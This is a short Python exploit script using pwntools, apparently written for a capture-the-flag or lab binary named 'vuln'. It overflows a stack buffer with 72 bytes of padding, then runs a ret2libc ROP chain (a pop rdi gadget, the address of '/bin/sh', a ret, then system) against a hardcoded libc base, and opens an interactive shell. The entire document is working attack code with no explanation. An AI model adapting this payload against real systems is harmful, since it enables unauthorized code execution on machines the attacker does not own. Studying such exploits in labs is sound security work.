from pwn import *

elf = context.binary = ELF("./vuln")
p = process()

libc = elf.libc
libc.address = 0x00007ffff7dbd000
SYSTEM = libc.sym["system"]
BIN_SH = next(libc.search(b"/bin/sh"))

pop_rdi = 0x00000000004011cb
ret = 0x0000000000401016

payload = b'A'*72
payload += p64(pop_rdi)
payload += p64(BIN_SH)
payload += p64(ret)
payload += p64(SYSTEM)
payload += p64(0x0)

log.info(p.clean())
p.sendline(payload)

p.interactive()
